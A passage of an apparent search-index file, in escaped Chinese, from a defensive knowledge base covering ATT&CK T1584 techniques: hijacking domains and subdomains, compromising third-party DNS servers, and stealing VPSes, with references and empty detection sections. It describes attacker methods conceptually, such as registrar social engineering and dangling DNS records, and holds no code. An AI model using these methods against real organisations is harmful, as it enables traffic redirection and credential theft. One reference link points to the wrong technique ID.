\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u52ab\u6301\u57df\u540d\u6216\u5b50\u57df\u540d\uff0c\u4ee5\u4fbf\u5728\u76ee\u6807\u653b\u51fb\u4e2d\u4f7f\u7528\u3002\u57df\u540d\u6ce8\u518c\u52ab\u6301\u662f\u6307\u672a\u7ecf\u539f\u6ce8\u518c\u4eba\u5141\u8bb8\u800c\u6539\u53d8\u57df\u540d\u6ce8\u518c\u7684\u884c\u4e3a\u3002\u653b\u51fb\u8005\u53ef\u80fd\u83b7\u5f97\u88ab\u5217\u4e3a\u57df\u540d\u6240\u6709\u8005\u7684\u7535\u5b50\u90ae\u4ef6\u8d26\u6237\u3002\u7136\u540e\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u58f0\u79f0\u4ed6\u4eec\u5fd8\u8bb0\u4e86\u81ea\u5df1\u7684\u5bc6\u7801\uff0c\u4ee5\u4fbf\u5bf9\u57df\u540d\u6ce8\u518c\u8fdb\u884c\u66f4\u6539\u3002\u5176\u4ed6\u7684\u53ef\u80fd\u6027\u5305\u62ec\u901a\u8fc7\u793e\u4f1a\u5de5\u7a0b\u4f7f\u57df\u540d\u6ce8\u518c\u670d\u52a1\u53f0\u83b7\u5f97\u5bf9\u8d26\u6237\u7684\u8bbf\u95ee\u6743\uff0c\u6216\u8005\u5229\u7528\u7eed\u8d39\u8fc7\u7a0b\u4e2d\u7684\u6f0f\u6d1e\u3002 \u5f53\u7ec4\u7ec7\u7684DNS\u6761\u76ee\u6307\u5411\u4e0d\u5b58\u5728\u7684\u6216\u88ab\u53d6\u6d88\u7684\u8d44\u6e90\u65f6\uff0c\u5c31\u4f1a\u53d1\u751f\u5b50\u57df\u52ab\u6301\u3002\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u63a7\u5236\u4e00\u4e2a\u5b50\u57df\uff0c\u5229\u7528\u4e0e\u8be5\u57df\u76f8\u5173\u7684\u4fe1\u4efb\u6765\u8fdb\u884c\u64cd\u4f5c \u3002 \u6d4b\u8bd5\u6848\u4f8b \u5b50\u57df\u540d\u52ab\u6301\u6f0f\u6d1e\u8be6\u89e3\u3001\u6316\u6398\u548c\u9632\u62a4 https://blog.csdn.net/nini_boom/article/details/108308966 \u5173\u4e8e\u5b50\u57df\u540d\u52ab\u6301\u7684\u4e00\u4e9b\u603b\u7ed3 https://xz.aliyun.com/t/6683 \u68c0\u6d4b\u65e5\u5fd7 \u65e0\u6cd5\u6709\u6548\u76d1\u6d4b \u6d4b\u8bd5\u590d\u73b0 \u65e0 \u6d4b\u8bd5\u7559\u75d5 \u65e0 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def \u65e0 \u5efa\u8bae \u7f13\u89e3\u63aa\u65bd \u8fd9\u79cd\u6280\u672f\u4e0d\u5bb9\u6613\u7528\u9884\u9632\u63a7\u5236\u6765\u7f13\u89e3\uff0c\u56e0\u4e3a\u5b83\u662f\u57fa\u4e8e\u4f01\u4e1a\u9632\u5fa1\u548c\u63a7\u5236\u8303\u56f4\u4e4b\u5916\u7684\u884c\u4e3a\u3002 \u68c0\u6d4b \u8fd9\u79cd\u6d3b\u52a8\u5927\u591a\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u80fd\u89c1\u5ea6\u4e4b\u5916\uff0c\u4f7f\u5f97\u5bf9\u8fd9\u79cd\u884c\u4e3a\u7684\u68c0\u6d4b\u53d8\u5f97\u56f0\u96be\u3002\u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u5982\u5728\u6307\u6325\u548c\u63a7\u5236\u671f\u95f4\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1584-001 https://attack.mitre.org/techniques/T1583/001/ \u5b50\u57df\u540d\u52ab\u6301\u6f0f\u6d1e\u8be6\u89e3\u3001\u6316\u6398\u548c\u9632\u62a4 https://blog.csdn.net/nini_boom/article/details/108308966 \u5173\u4e8e\u5b50\u57df\u540d\u52ab\u6301\u7684\u4e00\u4e9b\u603b\u7ed3 https://xz.aliyun.com/t/6683","title":"T1584-001-\u76d7\u53d6\u57fa\u7840\u8bbe\u65bd-\u57df\u540d"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1584-001-%E7%9B%97%E5%8F%96%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E5%9F%9F%E5%90%8D/#t1584-001-","text":"","title":"T1584-001-\u76d7\u53d6\u57fa\u7840\u8bbe\u65bd-\u57df\u540d"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1584-001-%E7%9B%97%E5%8F%96%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E5%9F%9F%E5%90%8D/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u52ab\u6301\u57df\u540d\u6216\u5b50\u57df\u540d\uff0c\u4ee5\u4fbf\u5728\u76ee\u6807\u653b\u51fb\u4e2d\u4f7f\u7528\u3002\u57df\u540d\u6ce8\u518c\u52ab\u6301\u662f\u6307\u672a\u7ecf\u539f\u6ce8\u518c\u4eba\u5141\u8bb8\u800c\u6539\u53d8\u57df\u540d\u6ce8\u518c\u7684\u884c\u4e3a\u3002\u653b\u51fb\u8005\u53ef\u80fd\u83b7\u5f97\u88ab\u5217\u4e3a\u57df\u540d\u6240\u6709\u8005\u7684\u7535\u5b50\u90ae\u4ef6\u8d26\u6237\u3002\u7136\u540e\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u58f0\u79f0\u4ed6\u4eec\u5fd8\u8bb0\u4e86\u81ea\u5df1\u7684\u5bc6\u7801\uff0c\u4ee5\u4fbf\u5bf9\u57df\u540d\u6ce8\u518c\u8fdb\u884c\u66f4\u6539\u3002\u5176\u4ed6\u7684\u53ef\u80fd\u6027\u5305\u62ec\u901a\u8fc7\u793e\u4f1a\u5de5\u7a0b\u4f7f\u57df\u540d\u6ce8\u518c\u670d\u52a1\u53f0\u83b7\u5f97\u5bf9\u8d26\u6237\u7684\u8bbf\u95ee\u6743\uff0c\u6216\u8005\u5229\u7528\u7eed\u8d39\u8fc7\u7a0b\u4e2d\u7684\u6f0f\u6d1e\u3002 \u5f53\u7ec4\u7ec7\u7684DNS\u6761\u76ee\u6307\u5411\u4e0d\u5b58\u5728\u7684\u6216\u88ab\u53d6\u6d88\u7684\u8d44\u6e90\u65f6\uff0c\u5c31\u4f1a\u53d1\u751f\u5b50\u57df\u52ab\u6301\u3002\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u63a7\u5236\u4e00\u4e2a\u5b50\u57df\uff0c\u5229\u7528\u4e0e\u8be5\u57df\u76f8\u5173\u7684\u4fe1\u4efb\u6765\u8fdb\u884c\u64cd\u4f5c \u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1584-001-%E7%9B%97%E5%8F%96%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E5%9F%9F%E5%90%8D/#_1","text":"\u5b50\u57df\u540d\u52ab\u6301\u6f0f\u6d1e\u8be6\u89e3\u3001\u6316\u6398\u548c\u9632\u62a4 https://blog.csdn.net/nini_boom/article/details/108308966 \u5173\u4e8e\u5b50\u57df\u540d\u52ab\u6301\u7684\u4e00\u4e9b\u603b\u7ed3 https://xz.aliyun.com/t/6683","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1584-001-%E7%9B%97%E5%8F%96%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E5%9F%9F%E5%90%8D/#_2","text":"\u65e0\u6cd5\u6709\u6548\u76d1\u6d4b","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1584-001-%E7%9B%97%E5%8F%96%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E5%9F%9F%E5%90%8D/#_3","text":"\u65e0","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1584-001-%E7%9B%97%E5%8F%96%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E5%9F%9F%E5%90%8D/#_4","text":"\u65e0","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1584-001-%E7%9B%97%E5%8F%96%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E5%9F%9F%E5%90%8D/#_5","text":"\u65e0","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1584-001-%E7%9B%97%E5%8F%96%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E5%9F%9F%E5%90%8D/#_6","text":"","title":"\u5efa\u8bae"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1584-001-%E7%9B%97%E5%8F%96%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E5%9F%9F%E5%90%8D/#_7","text":"\u8fd9\u79cd\u6280\u672f\u4e0d\u5bb9\u6613\u7528\u9884\u9632\u63a7\u5236\u6765\u7f13\u89e3\uff0c\u56e0\u4e3a\u5b83\u662f\u57fa\u4e8e\u4f01\u4e1a\u9632\u5fa1\u548c\u63a7\u5236\u8303\u56f4\u4e4b\u5916\u7684\u884c\u4e3a\u3002","title":"\u7f13\u89e3\u63aa\u65bd"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1584-001-%E7%9B%97%E5%8F%96%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E5%9F%9F%E5%90%8D/#_8","text":"\u8fd9\u79cd\u6d3b\u52a8\u5927\u591a\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u80fd\u89c1\u5ea6\u4e4b\u5916\uff0c\u4f7f\u5f97\u5bf9\u8fd9\u79cd\u884c\u4e3a\u7684\u68c0\u6d4b\u53d8\u5f97\u56f0\u96be\u3002\u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u5982\u5728\u6307\u6325\u548c\u63a7\u5236\u671f\u95f4\u3002","title":"\u68c0\u6d4b"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1584-001-%E7%9B%97%E5%8F%96%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E5%9F%9F%E5%90%8D/#_9","text":"MITRE-ATT&CK-T1584-001 https://attack.mitre.org/techniques/T1583/001/ \u5b50\u57df\u540d\u52ab\u6301\u6f0f\u6d1e\u8be6\u89e3\u3001\u6316\u6398\u548c\u9632\u62a4 https://blog.csdn.net/nini_boom/article/details/108308966 \u5173\u4e8e\u5b50\u57df\u540d\u52ab\u6301\u7684\u4e00\u4e9b\u603b\u7ed3 https://xz.aliyun.com/t/6683","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1584-002-%E7%9B%97%E5%8F%96%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-DNS%E6%9C%8D%E5%8A%A1/","text":"T1584-002-\u76d7\u53d6\u57fa\u7840\u8bbe\u65bd-DNS\u670d\u52a1 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u76d7\u53d6\u7b2c\u4e09\u65b9DNS\u670d\u52a1\u5668\uff0c\u8fd9\u4e9b\u670d\u52a1\u5668\u53ef\u4ee5\u5728\u653b\u51fb\u76ee\u6807\u671f\u95f4\u4f7f\u7528\u3002\u5728\u7834\u574f\u540e\u7684\u6d3b\u52a8\u4e2d\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u5229\u7528DNS\u6d41\u91cf\u8fdb\u884c\u5404\u79cd\u4efb\u52a1\uff0c\u5305\u62ec\u6307\u6325\u548c\u63a7\u5236\uff08\u4f8b\u5982\uff1a\u5e94\u7528\u5c42\u534f\u8bae\uff09\u3002\u653b\u51fb\u8005\u53ef\u80fd\u4e0d\u4f1a\u5efa\u7acb\u81ea\u5df1\u7684DNS\u670d\u52a1\u5668\uff0c\u800c\u662f\u5229\u7528\u7b2c\u4e09\u65b9DNS\u670d\u52a1\u5668\u4ee5\u652f\u6301\u884c\u52a8\u3002 \u901a\u8fc7\u76d7\u53d6DNS\u670d\u52a1\u5668\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u6539\u53d8DNS\u8bb0\u5f55\u3002\u8fd9\u6837\u7684\u63a7\u5236\u53ef\u4ee5\u8ba9\u4e00\u4e2a\u7ec4\u7ec7\u7684\u6d41\u91cf\u91cd\u65b0\u5b9a\u5411\uff0c\u4e3a\u653b\u51fb\u8005\u7684\u6536\u96c6\u548c\u51ed\u8bc1\u8bbf\u95ee\u5de5\u4f5c\u63d0\u4f9b\u4fbf\u5229\u3002 \u653b\u51fb\u8005\u4e5f\u53ef\u4ee5\u6084\u6084\u5730\u521b\u5efa\u6307\u5411\u6076\u610f\u670d\u52a1\u5668\u7684\u5b50\u57df\uff0c\u800c\u4e0d\u5411DNS\u670d\u52a1\u5668\u7684\u5b9e\u9645\u6240\u6709\u8005\u901a\u98ce\u62a5\u4fe1\u3002 \u6d4b\u8bd5\u6848\u4f8b \u6682\u65e0 \u68c0\u6d4b\u65e5\u5fd7 \u65e0\u6cd5\u6709\u6548\u76d1\u6d4b \u6d4b\u8bd5\u590d\u73b0 \u65e0 \u6d4b\u8bd5\u7559\u75d5 \u65e0 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def \u65e0 \u5efa\u8bae \u7f13\u89e3\u63aa\u65bd \u8fd9\u79cd\u6280\u672f\u4e0d\u5bb9\u6613\u7528\u9884\u9632\u63a7\u5236\u6765\u7f13\u89e3\uff0c\u56e0\u4e3a\u5b83\u662f\u57fa\u4e8e\u4f01\u4e1a\u9632\u5fa1\u548c\u63a7\u5236\u8303\u56f4\u4e4b\u5916\u7684\u884c\u4e3a\u3002 \u68c0\u6d4b \u8fd9\u79cd\u6d3b\u52a8\u5927\u591a\u53d1\u751f\u5728\u9632\u5fa1\u56e2\u961f\uff08\u7ec4\u7ec7\uff09\u7684\u80fd\u89c1\u5ea6\u4e4b\u5916\uff0c\u4f7f\u5f97\u5bf9\u8fd9\u79cd\u884c\u4e3a\u7684\u68c0\u6d4b\u53d8\u5f97\u56f0\u96be\u3002\u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u5982\u5728\u6307\u6325\u548c\u63a7\u5236\u671f\u95f4\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1584-002 https://attack.mitre.org/techniques/T1584/002/","title":"T1584-002-\u76d7\u53d6\u57fa\u7840\u8bbe\u65bd-DNS\u670d\u52a1"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1584-002-%E7%9B%97%E5%8F%96%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-DNS%E6%9C%8D%E5%8A%A1/#t1584-002-dns","text":"","title":"T1584-002-\u76d7\u53d6\u57fa\u7840\u8bbe\u65bd-DNS\u670d\u52a1"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1584-002-%E7%9B%97%E5%8F%96%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-DNS%E6%9C%8D%E5%8A%A1/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u76d7\u53d6\u7b2c\u4e09\u65b9DNS\u670d\u52a1\u5668\uff0c\u8fd9\u4e9b\u670d\u52a1\u5668\u53ef\u4ee5\u5728\u653b\u51fb\u76ee\u6807\u671f\u95f4\u4f7f\u7528\u3002\u5728\u7834\u574f\u540e\u7684\u6d3b\u52a8\u4e2d\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u5229\u7528DNS\u6d41\u91cf\u8fdb\u884c\u5404\u79cd\u4efb\u52a1\uff0c\u5305\u62ec\u6307\u6325\u548c\u63a7\u5236\uff08\u4f8b\u5982\uff1a\u5e94\u7528\u5c42\u534f\u8bae\uff09\u3002\u653b\u51fb\u8005\u53ef\u80fd\u4e0d\u4f1a\u5efa\u7acb\u81ea\u5df1\u7684DNS\u670d\u52a1\u5668\uff0c\u800c\u662f\u5229\u7528\u7b2c\u4e09\u65b9DNS\u670d\u52a1\u5668\u4ee5\u652f\u6301\u884c\u52a8\u3002 \u901a\u8fc7\u76d7\u53d6DNS\u670d\u52a1\u5668\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u6539\u53d8DNS\u8bb0\u5f55\u3002\u8fd9\u6837\u7684\u63a7\u5236\u53ef\u4ee5\u8ba9\u4e00\u4e2a\u7ec4\u7ec7\u7684\u6d41\u91cf\u91cd\u65b0\u5b9a\u5411\uff0c\u4e3a\u653b\u51fb\u8005\u7684\u6536\u96c6\u548c\u51ed\u8bc1\u8bbf\u95ee\u5de5\u4f5c\u63d0\u4f9b\u4fbf\u5229\u3002 \u653b\u51fb\u8005\u4e5f\u53ef\u4ee5\u6084\u6084\u5730\u521b\u5efa\u6307\u5411\u6076\u610f\u670d\u52a1\u5668\u7684\u5b50\u57df\uff0c\u800c\u4e0d\u5411DNS\u670d\u52a1\u5668\u7684\u5b9e\u9645\u6240\u6709\u8005\u901a\u98ce\u62a5\u4fe1\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1584-002-%E7%9B%97%E5%8F%96%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-DNS%E6%9C%8D%E5%8A%A1/#_1","text":"\u6682\u65e0","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1584-002-%E7%9B%97%E5%8F%96%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-DNS%E6%9C%8D%E5%8A%A1/#_2","text":"\u65e0\u6cd5\u6709\u6548\u76d1\u6d4b","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1584-002-%E7%9B%97%E5%8F%96%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-DNS%E6%9C%8D%E5%8A%A1/#_3","text":"\u65e0","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1584-002-%E7%9B%97%E5%8F%96%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-DNS%E6%9C%8D%E5%8A%A1/#_4","text":"\u65e0","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1584-002-%E7%9B%97%E5%8F%96%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-DNS%E6%9C%8D%E5%8A%A1/#_5","text":"\u65e0","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1584-002-%E7%9B%97%E5%8F%96%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-DNS%E6%9C%8D%E5%8A%A1/#_6","text":"","title":"\u5efa\u8bae"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1584-002-%E7%9B%97%E5%8F%96%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-DNS%E6%9C%8D%E5%8A%A1/#_7","text":"\u8fd9\u79cd\u6280\u672f\u4e0d\u5bb9\u6613\u7528\u9884\u9632\u63a7\u5236\u6765\u7f13\u89e3\uff0c\u56e0\u4e3a\u5b83\u662f\u57fa\u4e8e\u4f01\u4e1a\u9632\u5fa1\u548c\u63a7\u5236\u8303\u56f4\u4e4b\u5916\u7684\u884c\u4e3a\u3002","title":"\u7f13\u89e3\u63aa\u65bd"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1584-002-%E7%9B%97%E5%8F%96%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-DNS%E6%9C%8D%E5%8A%A1/#_8","text":"\u8fd9\u79cd\u6d3b\u52a8\u5927\u591a\u53d1\u751f\u5728\u9632\u5fa1\u56e2\u961f\uff08\u7ec4\u7ec7\uff09\u7684\u80fd\u89c1\u5ea6\u4e4b\u5916\uff0c\u4f7f\u5f97\u5bf9\u8fd9\u79cd\u884c\u4e3a\u7684\u68c0\u6d4b\u53d8\u5f97\u56f0\u96be\u3002\u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u5982\u5728\u6307\u6325\u548c\u63a7\u5236\u671f\u95f4\u3002","title":"\u68c0\u6d4b"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1584-002-%E7%9B%97%E5%8F%96%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-DNS%E6%9C%8D%E5%8A%A1/#_9","text":"MITRE-ATT&CK-T1584-002 https://attack.mitre.org/techniques/T1584/002/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1584-003-%E7%9B%97%E5%8F%96%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E8%99%9A%E6%8B%9F%E4%B8%93%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%99%A8/","text":"T1584-003-\u76d7\u53d6\u57fa\u7840\u8bbe\u65bd-\u865a\u62df\u4e13\u7528\u670d\u52a1\u5668 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u76d7\u53d6\u7b2c\u4e09\u65b9\u7684\u865a\u62df\u4e13\u7528\u670d\u52a1\u5668\uff08VPS\uff09\uff0c\u8fd9\u4e9b\u670d\u52a1\u5668\u53ef\u4ee5\u5728\u653b\u51fb\u76ee\u6807\u671f\u95f4\u4f7f\u7528\u3002\u6709\u5404\u79cd\u4e91\u670d\u52a1\u63d0\u4f9b\u5546\u5c06\u865a\u62df\u673a\u6216\u5bb9\u5668\u4f5c\u4e3a\u4e00\u79cd\u670d\u52a1\u51fa\u552e\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u76d7\u53d6\u7531\u7b2c\u4e09\u65b9\u5b9e\u4f53\u8d2d\u4e70\u7684VPS\uff0c\u4f5c\u4e3a\u57fa\u7840\u8bbe\u65bd\u7684VPS\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u5176\u96be\u4ee5\u5728\u7269\u7406\u4e0a\u5c06\u884c\u52a8\u4e0e\u81ea\u5df1\u8054\u7cfb\u8d77\u6765\u3002 \u76d7\u53d6VPS\u7528\u4e8e\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u540e\u671f\u9636\u6bb5\uff0c\u5982\u6307\u6325\u548c\u63a7\u5236\uff0c\u53ef\u4ee5\u8ba9\u653b\u51fb\u8005\u53d7\u76ca\u4e8e\u4e0e\u66f4\u9ad8\u58f0\u8a89\u7684\u4e91\u670d\u52a1\u63d0\u4f9b\u5546\u76f8\u5173\u7684\u666e\u904d\u6027\u548c\u4fe1\u4efb\uff0c\u4ee5\u53ca\u53d7\u611f\u67d3\u7684\u7b2c\u4e09\u65b9\u589e\u52a0\u7684\u4fe1\u4efb\u3002 \u6d4b\u8bd5\u6848\u4f8b \u865a\u62df\u4e13\u7528\u670d\u52a1\u5668\uff08\u82f1\u8bed\uff1aVirtual private server\uff0c\u7f29\u5199\u4e3a VPS\uff09\uff0c\u662f\u5c06\u4e00\u53f0\u670d\u52a1\u5668\u5206\u5272\u6210\u591a\u4e2a\u865a\u62df\u4e13\u4eab\u670d\u52a1\u5668\u7684\u670d\u52a1\u3002\u5b9e\u73b0VPS\u7684\u6280\u672f\u5206\u4e3a\u5bb9\u5668\u6280\u672f\u548c\u865a\u62df\u673a\u6280\u672f \u3002\u5728\u5bb9\u5668\u6216\u865a\u62df\u673a\u4e2d\uff0c\u6bcf\u4e2aVPS\u90fd\u53ef\u5206\u914d\u72ec\u7acb\u516c\u7f51IP\u5730\u5740\u3001\u72ec\u7acb\u64cd\u4f5c\u7cfb\u7edf\u3001\u5b9e\u73b0\u4e0d\u540cVPS\u95f4\u78c1\u76d8\u7a7a\u95f4\u3001\u5185\u5b58\u3001CPU\u8d44\u6e90\u3001\u8fdb\u7a0b\u548c\u7cfb\u7edf\u914d\u7f6e\u7684\u9694\u79bb\uff0c\u4e3a\u7528\u6237\u548c\u5e94\u7528\u7a0b\u5e8f\u6a21\u62df\u51fa\u201c\u72ec\u5360\u201d\u4f7f\u7528\u8ba1\u7b97\u8d44\u6e90\u7684\u4f53\u9a8c\u3002VPS\u53ef\u4ee5\u50cf\u72ec\u7acb\u670d\u52a1\u5668\u4e00\u6837\uff0c\u91cd\u88c5\u64cd\u4f5c\u7cfb\u7edf\uff0c\u5b89\u88c5\u7a0b\u5e8f\uff0c\u5355\u72ec\u91cd\u542f\u670d\u52a1\u5668\u3002VPS\u4e3a\u7528\u6237\u63d0\u4f9b\u4e86\u7ba1\u7406\u914d\u7f6e\u7684\u81ea\u7531\uff0c\u53ef\u7528\u4e8e\u4f01\u4e1a\u865a\u62df\u5316\uff0c\u4e5f\u53ef\u4ee5\u7528\u4e8eIDC\u8d44\u6e90\u79df\u7528\u3002 IDC\u8d44\u6e90\u79df\u7528\uff0c\u7531VPS\u63d0\u4f9b\u5546\u63d0\u4f9b\u3002\u4e0d\u540cVPS\u63d0\u4f9b\u5546\u6240\u4f7f\u7528\u7684\u786c\u4ef6VPS\u8f6f\u4ef6\u7684\u5dee\u5f02\uff0c\u53ca\u9500\u552e\u7b56\u7565\u7684\u4e0d\u540c\uff0cVPS\u7684\u4f7f\u7528\u4f53\u9a8c\u4e5f\u6709\u8f83\u5927\u5dee\u5f02\u3002\u5c24\u5176\u662fVPS\u63d0\u4f9b\u5546\u8d85\u5356\uff0c\u5bfc\u81f4\u5b9e\u4f53\u670d\u52a1\u5668\u8d85\u8d1f\u8377\u65f6\uff0cVPS\u6027\u80fd\u5c06\u53d7\u5230\u6781\u5927\u5f71\u54cd\u3002\u76f8\u5bf9\u6765\u8bf4\uff0c\u5bb9\u5668\u6280\u672f\u6bd4\u865a\u62df\u673a\u6280\u672f\u786c\u4ef6\u4f7f\u7528\u6548\u7387\u66f4\u9ad8\uff0c\u66f4\u6613\u4e8e\u8d85\u5356\uff0c\u6240\u4ee5\u4e00\u822c\u6765\u8bf4\u5bb9\u5668VPS\u7684\u4ef7\u683c\u90fd\u9ad8\u4e8e\u865a\u62df\u673aVPS\u7684\u4ef7\u683c\u3002 \u8fd9\u4e9bVPS\u4e3b\u673a\u4ee5\u6700\u5927\u5316\u7684\u6548\u7387\u5171\u4eab\u786c\u4ef6\u3001\u8f6f\u4ef6\u8bb8\u53ef\u8bc1\u4ee5\u53ca\u7ba1\u7406\u8d44\u6e90\u3002\u6bcf\u4e2aVPS\u4e3b\u673a\u90fd\u53ef\u5206\u914d\u72ec\u7acb\u516c\u7f51IP\u5730\u5740\u3001\u72ec\u7acb\u64cd\u4f5c\u7cfb\u7edf\u3001\u72ec\u7acb\u8d85\u5927\u7a7a\u95f4\u3001\u72ec\u7acb\u5185\u5b58\u3001\u72ec\u7acbCPU\u8d44\u6e90\u3001\u72ec\u7acb\u6267\u884c\u7a0b\u5e8f\u548c\u72ec\u7acb\u7cfb\u7edf\u914d\u7f6e\u7b49\u3002VPS\u4e3b\u673a\u7528\u6237\u53ef\u5728\u670d\u52a1\u5668\u4e0a\u81ea\u884c\u5b89\u88c5\u7a0b\u5e8f\uff0c\u5355\u72ec\u91cd\u542f\u4e3b\u673a\u3002\uff08ps:\u4e0d\u505a\u8fc7\u591a\u4ecb\u7ecd\uff0c\u61c2\u5f97\u90fd\u61c2\uff09 \u68c0\u6d4b\u65e5\u5fd7 \u65e0\u6cd5\u6709\u6548\u76d1\u6d4b \u6d4b\u8bd5\u590d\u73b0 \u65e0 \u6d4b\u8bd5\u7559\u75d5 \u65e0 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def \u65e0 \u5efa\u8bae \u7f13\u89e3\u63aa\u65bd \u8fd9\u79cd\u6280\u672f\u4e0d\u5bb9\u6613\u7528\u9884\u9632\u63a7\u5236\u6765\u7f13\u89e3\uff0c\u56e0\u4e3a\u5b83\u662f\u57fa\u4e8e\u4f01\u4e1a\u9632\u5fa1\u548c\u63a7\u5236\u8303\u56f4\u4e4b\u5916\u7684\u884c\u4e3a\u3002 \u68c0\u6d4b 